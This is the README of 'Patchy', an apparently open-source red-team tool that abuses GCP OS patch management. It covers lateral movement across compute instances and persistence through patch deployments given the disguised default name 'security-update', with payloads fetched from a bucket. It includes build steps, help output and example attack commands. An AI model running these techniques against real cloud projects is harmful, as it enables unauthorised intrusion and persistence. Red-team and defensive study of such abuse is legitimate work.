# Patchy
Automated lateral movement and persistence by abusing GCP OS patch management based on my [blog post](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching).

Patchy is made up of two main modes, lateral movement, and persistence. Persistence uses valid service account credentials to create a patch job or deployment. Lateral movement attempts to gain access to all the compute instances within a project. For it to be used, it must be within a GCP environment with the metadata API available. Lateral movement has a mode that enables it to see if exploitation is possible without attempting anything aggressive (good to see if 
your environment is secure).

For feature suggestions please open an issue. If there are any issues please create a PR with your fix.

# Build Instructions
### Windows
`mkdir build;GOOS=windows GOARCH=amd64 go build -o build/patchy.exe ./cmd/patchy/*.go`

### Linux
`mkdir build;GOOS=linux GOARCH=amd64 go build -o build/patchy ./cmd/patchy/*.go`

**Please note this requires >= [go 1.19](https://go.dev/dl/go1.19.src.tar.gz)**

# Usage
```
$ ./patchy -h
d8888b.  .d8b.  d888888b  .o88b. db   db db    db
88  `8D d8' `8b `~~88~~' d8P  Y8 88   88 `8b  d8'
88oodD' 88ooo88    88    8P      88ooo88  `8bd8'
88~~~   88~~~88    88    8b      88~~~88    88
88      88   88    88    Y8b  d8 88   88    88
88      YP   YP    YP     `Y88P' YP   YP    YP
        https://github.com/rek7/patchy
Patchy is a GCP exploitation tool designed for red teaming engagements.

Based on https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching

Usage:
  patchy [flags]
  patchy [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  lateral     Performs automatic lateral movement within a GCP environment
  persist     enables persistence on compute instances owned by service account

Flags:
  -b, --bucket string     bucket name hosting payload
  -h, --help              help for patchy
  -l, --lpayload string   name of linux shell payload (default "payload.bash")
  -p, --persist           enable persistence (patch deployment) (default false)
  -n, --pname string      name of patch deployment/job (default "security-update")
  -w, --wpayload string   name of windows powershell payload (default "payload.ps1")

Use "patchy [command] --help" for more information about a command.
```

# Example
Exploiting service accounts within local GCP environment, `myBucket` is the name of the public bucket hosting the payloads:

`$ ./patchy -b myBucket lat -e`

Installing persistence using service account in json format:

`$ ./patchy -b myBucket persist -c serviceAccount.json`